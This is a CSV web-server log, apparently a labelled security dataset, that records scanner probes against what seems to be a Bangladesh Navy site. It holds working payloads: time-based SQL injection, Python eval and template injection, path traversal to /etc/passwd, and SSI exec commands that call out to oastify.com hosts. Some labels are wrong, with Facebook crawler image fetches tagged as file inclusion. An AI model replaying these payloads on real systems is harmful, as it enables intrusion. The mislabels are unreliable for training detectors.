timestamp,ip,method,url,status,attack_type,user_agent
2025-05-22 04:17:47,173.252.127.20,GET,/public/bn_link_gallery/eaaa438df20c03b031d9b97b1ca9cb64.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:47,173.252.127.9,GET,/public/photo_gallery/2_1567313749.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:47,173.252.127.39,GET,/public/photo_gallery/3_1567313762.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:47,173.252.127.20,GET,/public/video_gallery/Capture_1597144767.PNG,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,173.252.127.9,GET,/public/video_gallery/20180506123617.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,173.252.127.39,GET,/public/frontend/template/news/images/img_sme_news_and_events.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,173.252.127.10,GET,/public/frontend/template/graphics/section3-dots.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,173.252.127.11,GET,/public/frontend/template/img/gallery-background.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,173.252.127.20,GET,/public/frontend/template/graphics/info-box-theme-bg.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,173.252.127.9,GET,/public/frontend/template/img/navy.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:18,69.171.234.7,GET,/public/bn_link_gallery/b508c7c08f2039321122d7c9393317cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:18,69.171.234.10,GET,/public/bn_link_gallery/66cfb0fd33972834beff6d67ab1eebb8.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:19,173.252.95.25,GET,/public/bn_link_gallery/1be3731a9340a8606cfd18dba168f6b0.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:22,69.171.251.115,GET,/public/bn_link_gallery/536c7fa885bdc532d9bca79143633342.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:22,69.171.234.8,GET,/public/bn_link_gallery/66cfb0fd33972834beff6d67ab1eebb8.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:27,69.63.189.4,GET,/public/bn_link_gallery/6674b235a2fa3859f4ee4aa37122edea.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:39,173.252.127.3,GET,/public/bn_link_gallery/00460804b63d5e8ae978adb03dbabf36.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:41,69.171.234.6,GET,/public/bn_link_gallery/ff90a98872440d7970ac75350d1291cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:42,173.252.127.59,GET,/public/bn_link_gallery/ff90a98872440d7970ac75350d1291cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:53,69.63.189.9,GET,/public/bn_link_gallery/536c7fa885bdc532d9bca79143633342.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:19:04,173.252.127.20,GET,/public/bn_link_gallery/1be3731a9340a8606cfd18dba168f6b0.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:19:58,69.171.249.5,GET,/public/bn_link_gallery/6674b235a2fa3859f4ee4aa37122edea.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:26:16,173.239.196.10,GET,/navy/search?q=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%226ok%22%20value%3d%225nj883t0k3%22--%3e%3c!--%23set%20var%3d%228qm%22%20value%3d%227plaa5v2m5%22--%3e%3c!--%23echo%20var%3d%226ok%22--%3e%3c!--%23echo%20var%3d%228qm%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20sa6vvqgn7q3a238ylegq6coa319uxlldj1ao0cp.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:26:52,173.239.196.10,GET,/public/frontend/template/css'(select*from(select(sleep(20)))a)'/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:27:39,173.239.196.15,GET,/public/frontend/template/css'%2b(select*from(select(sleep(20)))a)%2b'/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:28:32,173.239.196.14,GET,/public/frontend/template/css'%20waitfor%20delay'0%3a0%3a20'--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:29:20,173.239.196.9,GET,/public/frontend/template/css')waitfor%20delay'0%3a0%3a20'--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:30:05,173.239.196.10,GET,/public/frontend/template/css'%7c%7cpg_sleep(20)--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:30:58,173.239.196.9,GET,/public/frontend/template/css'%20AND%20pg_sleep(20)--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:31:42,173.239.196.10,GET,/public/frontend/template/css'%2c''%7c%7cpg_sleep(20)--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:35:24,173.239.196.11,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024?eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))=1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:36:50,173.252.127.1,GET,/public/bn_link_gallery/b508c7c08f2039321122d7c9393317cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:38:00,173.239.196.12,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024?%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22xi2%22%20value%3d%22wh1z2unreu%22--%3e%3c!--%23set%20var%3d%22zk4%22%20value%3d%22yj314wptgw%22--%3e%3c!--%23echo%20var%3d%22xi2%22--%3e%3c!--%23echo%20var%3d%22zk4%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20j4omphae1hx1wu2pf5ah03i1xs3lrff7dv7iy6n.oastify.com%22%20--%3e=1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:46:39,173.239.196.15,POST,/Simulators'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:46:59,173.239.196.13,POST,/OJT'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:47:31,173.239.196.13,POST,/Simulators'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:47:49,173.239.196.13,POST,/OJT'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:48:19,173.239.196.15,POST,/Simulators'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:48:32,173.239.196.11,POST,/OJT'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:48:59,173.239.196.10,POST,/Simulators%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:07,173.239.196.10,GET,/public/frontend/template/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:14,173.239.196.12,POST,/OJT%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:47,173.239.196.12,POST,/Simulators'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:54,173.239.196.10,GET,/public/frontend/template/css%7b$%7bsleep(20)%7d%7d/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:50:01,173.239.196.13,POST,/OJT'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:50:48,173.239.196.15,POST,/Simulators')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:51:05,173.239.196.9,POST,/OJT')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:51:39,173.239.196.13,POST,/Simulators'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:51:55,173.239.196.14,POST,/OJT'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:52:32,173.239.196.10,POST,/Simulators'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:07,173.239.196.12,POST,/OJT'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:17,173.239.196.11,POST,/Simulators'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:47,173.239.196.11,POST,/OJT'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:56,173.239.196.11,POST,/Simulators'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:54:23,173.239.196.14,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:54:31,173.239.196.14,POST,/OJT'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:54:44,173.239.196.12,POST,/Simulators')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:08,173.239.196.10,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:17,173.239.196.14,POST,/OJT')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:30,173.239.196.9,POST,/Simulators'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:54,173.239.196.15,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:56:09,173.239.196.14,POST,/OJT'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:56:48,173.239.196.12,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:57:35,173.239.196.12,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:58:22,173.239.196.10,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:59:20,173.239.196.15,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:00:15,173.239.196.10,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:00:54,173.239.196.10,GET,/public/frontend/template/../../../../../../../../../../../../../../../../etc/passwd/fonts/fontawesome-webfont.woff2?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:01:13,173.239.196.11,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:01:48,173.239.196.14,GET,/public/frontend/template//etc/passwd/fonts/fontawesome-webfont.woff2?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:02:03,173.239.196.12,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:02:38,173.239.196.9,GET,/public/frontend/template/css../../../../../../../../../../../../../../../../etc/passwd/fonts/fontawesome-webfont.woff2?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:02:50,173.239.196.9,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:03:23,173.239.196.11,GET,/public/frontend/template/../../../../../../../../../../../../../../../../etc/passwd%00css/fonts/fontawesome-webfont.woff2?v=4.6.1,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-22 05:03:37,173.239.196.14,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:09:03,173.239.196.9,POST,/Simulators'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:09:51,173.239.196.10,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:10:48,173.239.196.9,POST,/Simulators'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:11:40,173.239.196.10,POST,/OJT'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:11:47,173.239.196.11,POST,/Simulators%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:12:40,173.239.196.14,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:13:20,173.239.196.15,POST,/OJT'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:14:07,173.239.196.9,POST,/OJT%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:17:07,173.239.196.11,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:17:58,173.239.196.14,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:18:39,173.239.196.14,POST,/design-and-Evaluation-cell'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:18:45,173.239.196.15,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:19:30,173.239.196.13,POST,/design-and-Evaluation-cell'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:19:37,173.239.196.12,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:20:24,173.239.196.14,POST,/design-and-Evaluation-cell'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:21:21,173.239.196.15,POST,/design-and-Evaluation-cell%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:21:53,173.239.196.15,GET,/public/frontend/template/css/fonts'(select*from(select(sleep(20)))a)'/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:22:13,173.239.196.10,POST,/design-and-Evaluation-cell'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:22:43,173.239.196.13,GET,/public/frontend/template/css/fonts'%2b(select*from(select(sleep(20)))a)%2b'/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:23:03,173.239.196.9,POST,/design-and-Evaluation-cell')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:23:38,173.239.196.10,GET,/public/frontend/template/css/fonts'%20waitfor%20delay'0%3a0%3a20'--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:23:57,173.239.196.11,POST,/design-and-Evaluation-cell'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:24:19,173.239.196.11,GET,/public/frontend/template/css/fonts')waitfor%20delay'0%3a0%3a20'--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:24:39,173.239.196.9,POST,/design-and-Evaluation-cell'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:25:12,173.239.196.14,GET,/public/frontend/template/css/fonts'%7c%7cpg_sleep(20)--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
